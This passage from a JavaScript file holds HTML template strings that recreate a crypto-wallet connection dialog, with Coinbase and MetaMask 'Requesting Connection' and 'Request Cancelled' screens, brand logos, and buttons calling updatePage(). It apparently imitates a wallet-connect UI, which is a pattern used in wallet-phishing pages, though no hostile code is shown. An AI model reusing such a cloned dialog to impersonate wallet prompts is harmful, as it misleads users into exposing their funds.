                                                        background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIwIiBoZWlnaHQ9IjEyMCIgdmlld0JveD0iMCAwIDEyMCAxMjAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMjAiIGhlaWdodD0iMTIwIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfNjJfMzI5KSIvPgo8cGF0aCBkPSJNMjAgMzhIMjZDNTYuOTI3OSAzOCA4MiA2My4wNzIxIDgyIDk0VjEwMEg5NEM5Ny4zMTM3IDEwMCAxMDAgOTcuMzEzNyAxMDAgOTRDMTAwIDUzLjEzMDkgNjYuODY5MSAyMCAyNiAyMEMyMi42ODYzIDIwIDIwIDIyLjY4NjMgMjAgMjZWMzhaIiBmaWxsPSJ1cmwoI3BhaW50MV9yYWRpYWxfNjJfMzI5KSIvPgo8cGF0aCBkPSJNODQgOTRIMTAwQzEwMCA5Ny4zMTM3IDk3LjMxMzcgMTAwIDk0IDEwMEg4NFY5NFoiIGZpbGw9InVybCgjcGFpbnQyX2xpbmVhcl82Ml8zMjkpIi8+CjxwYXRoIGQ9Ik0yNiAyMEwyNiAzNkgyMEwyMCAyNkMyMCAyMi42ODYzIDIyLjY4NjMgMjAgMjYgMjBaIiBmaWxsPSJ1cmwoI3BhaW50M19saW5lYXJfNjJfMzI5KSIvPgo8cGF0aCBkPSJNMjAgMzZIMjZDNTguMDMyNSAzNiA4NCA2MS45Njc1IDg0IDk0VjEwMEg2NlY5NEM2NiA3MS45MDg2IDQ4LjA5MTQgNTQgMjYgNTRIMjBWMzZaIiBmaWxsPSJ1cmwoI3BhaW50NF9yYWRpYWxfNjJfMzI5KSIvPgo8cGF0aCBkPSJNNjggOTRIODRWMTAwSDY4Vjk0WiIgZmlsbD0idXJsKCNwYWludDVfbGluZWFyXzYyXzMyOSkiLz4KPHBhdGggZD0iTTIwIDUyTDIwIDM2TDI2IDM2TDI2IDUySDIwWiIgZmlsbD0idXJsKCNwYWludDZfbGluZWFyXzYyXzMyOSkiLz4KPHBhdGggZD0iTTIwIDYyQzIwIDY1LjMxMzcgMjIuNjg2MyA2OCAyNiA2OEM0MC4zNTk0IDY4IDUyIDc5LjY0MDYgNTIgOTRDNTIgOTcuMzEzNyA1NC42ODYzIDEwMCA1OCAxMDBINjhWOTRDNjggNzAuODA0IDQ5LjE5NiA1MiAyNiA1MkgyMFY2MloiIGZpbGw9InVybCgjcGFpbnQ3X3JhZGlhbF82Ml8zMjkpIi8+CjxwYXRoIGQ9Ik01MiA5NEg2OFYxMDBINThDNTQuNjg2MyAxMDAgNTIgOTcuMzEzNyA1MiA5NFoiIGZpbGw9InVybCgjcGFpbnQ4X3JhZGlhbF82Ml8zMjkpIi8+CjxwYXRoIGQ9Ik0yNiA2OEMyMi42ODYzIDY4IDIwIDY1LjMxMzcgMjAgNjJMMjAgNTJMMjYgNTJMMjYgNjhaIiBmaWxsPSJ1cmwoI3BhaW50OV9yYWRpYWxfNjJfMzI5KSIvPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDBfbGluZWFyXzYyXzMyOSIgeDE9IjYwIiB5MT0iMCIgeDI9IjYwIiB5Mj0iMTIwIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiMxNzQyOTkiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjMDAxRTU5Ii8+CjwvbGluZWFyR3JhZGllbnQ+CjxyYWRpYWxHcmFkaWVudCBpZD0icGFpbnQxX3JhZGlhbF82Ml8zMjkiIGN4PSIwIiBjeT0iMCIgcj0iMSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoMjYgOTQpIHJvdGF0ZSgtOTApIHNjYWxlKDc0KSI+CjxzdG9wIG9mZnNldD0iMC43NzAyNzciIHN0b3AtY29sb3I9IiNGRjQwMDAiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjODc1NEM5Ii8+CjwvcmFkaWFsR3JhZGllbnQ+CjxsaW5lYXJHcmFkaWVudCBpZD0icGFpbnQyX2xpbmVhcl82Ml8zMjkiIHgxPSI4MyIgeTE9Ijk3IiB4Mj0iMTAwIiB5Mj0iOTciIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agc3RvcC1jb2xvcj0iI0ZGNDAwMCIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiM4NzU0QzkiLz4KPC9saW5lYXJHcmFkaWVudD4KPGxpbmVhckdyYWRpZW50IGlkPSJwYWludDNfbGluZWFyXzYyXzMyOSIgeDE9IjIzIiB5MT0iMjAiIHgyPSIyMyIgeTI9IjM3IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiM4NzU0QzkiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjRkY0MDAwIi8+CjwvbGluZWFyR3JhZGllbnQ+CjxyYWRpYWxHcmFkaWVudCBpZD0icGFpbnQ0X3JhZGlhbF82Ml8zMjkiIGN4PSIwIiBjeT0iMCIgcj0iMSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoMjYgOTQpIHJvdGF0ZSgtOTApIHNjYWxlKDU4KSI+CjxzdG9wIG9mZnNldD0iMC43MjM5MjkiIHN0b3AtY29sb3I9IiNGRkY3MDAiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjRkY5OTAxIi8+CjwvcmFkaWFsR3JhZGllbnQ+CjxsaW5lYXJHcmFkaWVudCBpZD0icGFpbnQ1X2xpbmVhcl82Ml8zMjkiIHgxPSI2OCIgeTE9Ijk3IiB4Mj0iODQiIHkyPSI5NyIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiPgo8c3RvcCBzdG9wLWNvbG9yPSIjRkZGNzAwIi8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI0ZGOTkwMSIvPgo8L2xpbmVhckdyYWRpZW50Pgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50Nl9saW5lYXJfNjJfMzI5IiB4MT0iMjMiIHkxPSI1MiIgeDI9IjIzIiB5Mj0iMzYiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agc3RvcC1jb2xvcj0iI0ZGRjcwMCIvPgo8c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNGRjk5MDEiLz4KPC9saW5lYXJHcmFkaWVudD4KPHJhZGlhbEdyYWRpZW50IGlkPSJwYWludDdfcmFkaWFsXzYyXzMyOSIgY3g9IjAiIGN5PSIwIiByPSIxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09InRyYW5zbGF0ZSgyNiA5NCkgcm90YXRlKC05MCkgc2NhbGUoNDIpIj4KPHN0b3Agb2Zmc2V0PSIwLjU5NTEzIiBzdG9wLWNvbG9yPSIjMDBBQUZGIi8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iIzAxREE0MCIvPgo8L3JhZGlhbEdyYWRpZW50Pgo8cmFkaWFsR3JhZGllbnQgaWQ9InBhaW50OF9yYWRpYWxfNjJfMzI5IiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDUxIDk3KSBzY2FsZSgxNyA0NS4zMzMzKSI+CjxzdG9wIHN0b3AtY29sb3I9IiMwMEFBRkYiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjMDFEQTQwIi8+CjwvcmFkaWFsR3JhZGllbnQ+CjxyYWRpYWxHcmFkaWVudCBpZD0icGFpbnQ5X3JhZGlhbF82Ml8zMjkiIGN4PSIwIiBjeT0iMCIgcj0iMSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoMjMgNjkpIHJvdGF0ZSgtOTApIHNjYWxlKDE3IDMyMi4zNykiPgo8c3RvcCBzdG9wLWNvbG9yPSIjMDBBQUZGIi8+CjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iIzAxREE0MCIvPgo8L3JhZGlhbEdyYWRpZW50Pgo8L2RlZnM+Cjwvc3ZnPgo=');
                                                    "
                                                ></svg>
                                            </div>
                                            <div style="width: 50%; overflow: hidden; border-radius: 27.5%;">
                                                <svg
                                                    aria-hidden="true"
                                                    width="32"
                                                    height="32"
                                                    viewBox="0 0 32 32"
                                                    fill="none"
                                                    xmlns="http://www.w3.org/2000/svg"
                                                    style="background: linear-gradient(180deg, var(--ck-brand-imtoken-01) 0%, var(--ck-brand-imtoken-02) 100%);"
                                                >
                                                    <path
                                                        d="M26.8543 9.96509C27.5498 19.3857 21.4942 23.8384 16.0655 24.3132C11.0184 24.7546 6.26765 21.6534 5.85087 16.8885C5.50707 12.952 7.94004 11.2761 9.8516 11.109C11.8177 10.9367 13.4698 12.2925 13.6132 13.9342C13.7512 15.5125 12.7664 16.2308 12.0815 16.2906C11.5398 16.3381 10.8584 16.0093 10.7968 15.3032C10.7441 14.6965 10.9744 14.6138 10.9182 13.9693C10.8179 12.8219 9.81731 12.6882 9.26951 12.7357C8.60654 12.7937 7.40368 13.5675 7.5725 15.4949C7.7422 17.439 9.60628 18.9751 12.0498 18.7614C14.6868 18.531 16.5227 16.4779 16.6608 13.5983C16.6595 13.4458 16.6916 13.2948 16.7548 13.156L16.7557 13.1525C16.7841 13.0922 16.8174 13.0342 16.8551 12.9793C16.9113 12.8949 16.9835 12.8016 17.0767 12.6997C17.0775 12.697 17.0775 12.697 17.0793 12.697C17.147 12.6205 17.2288 12.5379 17.3211 12.4491C18.473 11.3623 22.6214 8.79916 26.5448 9.61074C26.6277 9.62851 26.7026 9.67262 26.7584 9.73649C26.8142 9.80035 26.8478 9.88054 26.8543 9.96509"
                                                        fill="white"
                                                    ></path>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <span class="sc-olbas ftvWqB">Other Wallets</span>
                            </button>
                        </a>
                        </div>
                        <div id="different-button" class="sc-lbxAil hLcKTw">
                            <button onclick="updatePage(WalletsModal);" class="sc-iNWwEs fKICOT dasdvr">
                                <svg aria-hidden="true" width="20" height="19" viewBox="0 0 20 19" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path
                                        d="M1.57568 4.60616C1.57568 2.69827 3.12234 1.15161 5.03023 1.15161H15.3939C17.3018 1.15161 18.8484 2.69826 18.8484 4.60616V10.3637C18.8484 12.2716 17.3018 13.8183 15.3939 13.8183H5.03023C3.12234 13.8183 1.57568 12.2716 1.57568 10.3637V4.60616Z"
                                        stroke="currentColor"
                                        stroke-width="2"
                                    ></path>
                                    <path
                                        d="M1 4.79293C1 2.435 3.31004 0.770014 5.54697 1.51566L12.4561 3.81869C13.8667 4.2889 14.8182 5.60901 14.8182 7.09596V13.6313C14.8182 15.9892 12.5081 17.6542 10.2712 16.9086L3.36212 14.6056C1.95149 14.1353 1 12.8152 1 11.3283V4.79293Z"
                                        fill="var(--ck-body-background)"
                                        stroke="currentColor"
                                        stroke-width="2"
                                    ></path>
                                    <circle cx="10.3863" cy="10.1894" r="1.32574" fill="currentColor"></circle>
                                </svg>
                                I use different wallet
                            </button><!--I don't have a wallet -->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

const CoinbaseModal = `CoinbaseModal`;
const CoinbaseRequestingModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 351px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Coinbase Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <svg aria-hidden="true" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <circle cx="10" cy="10" r="10" fill="var(--ck-brand-coinbaseWallet)"></circle>
                                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M10.0001 17C13.8661 17 17.0001 13.866 17.0001 10C17.0001 6.13401 13.8661 3 10.0001 3C6.13413 3 3.00012 6.13401 3.00012 10C3.00012 13.866 6.13413 17 10.0001 17ZM8.25012 7.71429C7.95427 7.71429 7.71441 7.95414 7.71441 8.25V11.75C7.71441 12.0459 7.95427 12.2857 8.25012 12.2857H11.7501C12.046 12.2857 12.2858 12.0459 12.2858 11.75V8.25C12.2858 7.95414 12.046 7.71429 11.7501 7.71429H8.25012Z" fill="white"></path>
                                                </svg>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq">
                                                <div class="sc-HzFiz dYEcPx" style="opacity: 1;">
                                                    <svg aria-hidden="true" width="102" height="102" viewBox="0 0 102 102" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M52 100C24.3858 100 2 77.6142 2 50" stroke="url(#paint0_linear_1943_4139)" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <defs>
                                                            <linearGradient id="paint0_linear_1943_4139" x1="2" y1="48.5" x2="53" y2="100" gradientUnits="userSpaceOnUse">
                                                                <stop stop-color="var(--ck-spinner-color)"></stop>
                                                                <stop offset="1" stop-color="var(--ck-spinner-color)" stop-opacity="0"></stop>
                                                            </linearGradient>
                                                        </defs>
                                                    </svg>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 28px;">
                                            <h1 class="sc-ftvSup fqLYro">Requesting Connection<br></h1>
                                            <div class="sc-papXJ jCcNJP">Open the Coinbase browser <br>extension to connect your wallet.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;
const CoinbaseRejectedModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 351px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Coinbase Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd bxwbBD">
                                        <button aria-label="Retry" class="sc-eKBdFk iGfDZB" style="opacity: 1; transform: none;">
                                            <div class="sc-bUbCnL ilqOAO">
                                                <div>
                                                    <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M32 16C32 24.8366 24.8366 32 16 32C7.16344 32 0 24.8366 0 16C0 7.16344 7.16344 0 16 0C24.8366 0 32 7.16344 32 16ZM24.5001 8.74263C25.0834 8.74263 25.5563 9.21551 25.5563 9.79883V14.5997C25.5563 15.183 25.0834 15.6559 24.5001 15.6559H19.6992C19.1159 15.6559 18.643 15.183 18.643 14.5997C18.643 14.0164 19.1159 13.5435 19.6992 13.5435H21.8378L20.071 11.8798C20.0632 11.8724 20.0555 11.865 20.048 11.8574C19.1061 10.915 17.8835 10.3042 16.5643 10.1171C15.2452 9.92999 13.9009 10.1767 12.7341 10.82C11.5674 11.4634 10.6413 12.4685 10.0955 13.684C9.54968 14.8994 9.41368 16.2593 9.70801 17.5588C10.0023 18.8583 10.711 20.0269 11.7273 20.8885C12.7436 21.7502 14.0124 22.2582 15.3425 22.336C16.6726 22.4138 17.9919 22.0572 19.1017 21.3199C19.5088 21.0495 19.8795 20.7333 20.2078 20.3793C20.6043 19.9515 21.2726 19.9262 21.7004 20.3228C22.1282 20.7194 22.1534 21.3876 21.7569 21.8154C21.3158 22.2912 20.8176 22.7161 20.2706 23.0795C18.7793 24.0702 17.0064 24.5493 15.2191 24.4448C13.4318 24.3402 11.7268 23.6576 10.3612 22.4998C8.9956 21.3419 8.0433 19.7716 7.6478 18.0254C7.2523 16.2793 7.43504 14.4519 8.16848 12.8186C8.90192 11.1854 10.1463 9.83471 11.7142 8.97021C13.282 8.10572 15.0884 7.77421 16.861 8.02565C18.6282 8.27631 20.2664 9.09278 21.5304 10.3525L23.4439 12.1544V9.79883C23.4439 9.21551 23.9168 8.74263 24.5001 8.74263Z" fill="currentColor"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                        </button>
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <svg aria-hidden="true" width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                    <circle cx="10" cy="10" r="10" fill="var(--ck-brand-coinbaseWallet)"></circle>
                                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M10.0001 17C13.8661 17 17.0001 13.866 17.0001 10C17.0001 6.13401 13.8661 3 10.0001 3C6.13413 3 3.00012 6.13401 3.00012 10C3.00012 13.866 6.13413 17 10.0001 17ZM8.25012 7.71429C7.95427 7.71429 7.71441 7.95414 7.71441 8.25V11.75C7.71441 12.0459 7.95427 12.2857 8.25012 12.2857H11.7501C12.046 12.2857 12.2858 12.0459 12.2858 11.75V8.25C12.2858 7.95414 12.046 7.71429 11.7501 7.71429H8.25012Z" fill="white"></path>
                                                </svg>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 28px;">
                                            <h1 class="sc-ftvSup fqLYro">Request Cancelled<br></h1>
                                            <div class="sc-papXJ jCcNJP">You cancelled the request.<br>Click above to try again.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

const MetamaskModal = `MetamaskModal`;
const MetamaskRequestingModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 351px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">MetaMask</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                    <svg aria-hidden="true" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M27.2684 4.03027L17.5018 11.2841L19.3079 7.00442L27.2684 4.03027Z" fill="var(--ck-brand-metamask-02)" stroke="var(--ck-brand-metamask-02)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M4.7218 4.03027L14.4099 11.3528L12.6921 7.00442L4.7218 4.03027Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M23.7544 20.8438L21.1532 24.8289L26.7187 26.3602L28.3187 20.9321L23.7544 20.8438Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M3.69104 20.9321L5.28117 26.3602L10.8467 24.8289L8.24551 20.8438L3.69104 20.9321Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.5327 14.1108L8.98181 16.4568L14.5081 16.7022L14.3117 10.7637L10.5327 14.1108Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M21.4576 14.1111L17.6295 10.6953L17.5018 16.7025L23.0182 16.4571L21.4576 14.1111Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.8469 24.8292L14.1647 23.2096L11.2984 20.9717L10.8469 24.8292Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.8257 23.2096L21.1531 24.8292L20.6918 20.9717L17.8257 23.2096Z" fill="var(--ck-brand-metamask-08)" stroke="var(--ck-brand-metamask-08)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M21.1531 24.8296L17.8257 23.21L18.0906 25.3793L18.0612 26.2921L21.1531 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.8469 24.8296L13.9388 26.2921L13.9192 25.3793L14.1647 23.21L10.8469 24.8296Z" fill="var(--ck-brand-metamask-06)" stroke="var(--ck-brand-metamask-06)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M13.9877 19.5389L11.2196 18.7242L13.1729 17.8311L13.9877 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M18.0023 19.5389L18.8171 17.8311L20.7802 18.7242L18.0023 19.5389Z" fill="var(--ck-brand-metamask-09)" stroke="var(--ck-brand-metamask-09)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M10.8468 24.8289L11.3179 20.8438L8.24561 20.9321L10.8468 24.8289Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M20.6821 20.8438L21.1532 24.8289L23.7544 20.9321L20.6821 20.8438Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M23.0182 16.4565L17.5018 16.7019L18.0122 19.5387L18.827 17.8308L20.7902 18.7239L23.0182 16.4565Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M11.2198 18.7239L13.1829 17.8308L13.9878 19.5387L14.5081 16.7019L8.98181 16.4565L11.2198 18.7239Z" fill="var(--ck-brand-metamask-03)" stroke="var(--ck-brand-metamask-03)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M8.98181 16.4565L11.2983 20.9718L11.2198 18.7239L8.98181 16.4565Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M20.7901 18.7239L20.6919 20.9718L23.0181 16.4565L20.7901 18.7239Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M14.508 16.7021L13.9878 19.5389L14.6356 22.886L14.7828 18.4788L14.508 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M17.5017 16.7021L17.2367 18.4689L17.3545 22.886L18.0121 19.5389L17.5017 16.7021Z" fill="var(--ck-brand-metamask-10)" stroke="var(--ck-brand-metamask-10)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M18.0121 19.5388L17.3545 22.886L17.8257 23.2099L20.6918 20.972L20.79 18.7241L18.0121 19.5388Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M11.2196 18.7241L11.2981 20.972L14.1644 23.2099L14.6355 22.886L13.9877 19.5388L11.2196 18.7241Z" fill="var(--ck-brand-metamask-01)" stroke="var(--ck-brand-metamask-01)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
                                                        <path d="M18.0615 26.2917L18.0908 25.3788L17.8455 25.1628H14.145L13.9192 25.3788L13.9388 26.2917L10.8469 24.8291L11.9267 25.7126L14.1155 27.234H17.875L20.0736 25.7126L21.1533 24.8291L18.0615 26.2917Z" fill="var(--ck-brand-metamask-07)" stroke="var(--ck-brand-metamask-07)" stroke-width="0.269931" stroke-linecap="round" stroke-linejoin="round"></path>
